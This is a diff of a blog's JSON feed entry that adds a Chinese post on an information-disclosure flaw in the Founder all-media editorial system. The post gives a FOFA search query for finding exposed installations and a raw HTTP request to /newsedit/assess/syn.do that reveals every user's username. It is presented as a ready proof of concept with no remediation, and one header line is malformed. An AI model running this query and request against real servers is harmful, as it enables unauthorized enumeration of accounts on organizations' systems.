@@ -7,9 +7,9 @@
         {
             "id": "http://example.com/2024/10/28/3/",
             "url": "http://example.com/2024/10/28/3/",
-            "title": "VMware ESXi CVE-2024-37085漏洞验证分析",
+            "title": "方正全媒体采编系统存在syn.do信息泄露漏洞",
             "date_published": "2024-10-28T08:33:09.466Z",
-            "content_html": "<p>ss</p>\n",
+            "content_html": "<h1 id=\"方正全媒体采编系统存在syndo信息泄露漏洞\"><a class=\"markdownIt-Anchor\" href=\"#方正全媒体采编系统存在syndo信息泄露漏洞\">#</a> 方正全媒体采编系统存在 syn.do 信息泄露漏洞</h1>\n<h2 id=\"1-漏洞介绍\"><a class=\"markdownIt-Anchor\" href=\"#1-漏洞介绍\">#</a> 1、漏洞介绍</h2>\n<p>​\t方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。</p>\n<h2 id=\"2-fofa语句\"><a class=\"markdownIt-Anchor\" href=\"#2-fofa语句\">#</a> 2、 fofa 语句</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app=&quot;FOUNDER-全媒体采编系统&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-poc\"><a class=\"markdownIt-Anchor\" href=\"#3-poc\">#</a> 3、POC</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /newsedit/assess/syn.do?type=org HTTP/1.1</span><br><span class=\"line\">Host: </span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Content-Length: 185Accept: */*</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-验证\"><a class=\"markdownIt-Anchor\" href=\"#4-验证\">#</a> 4、验证</h2>\n<p><img src=\"https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png\" alt=\"image.png\"></p>\n",
             "tags": []
         },
         {
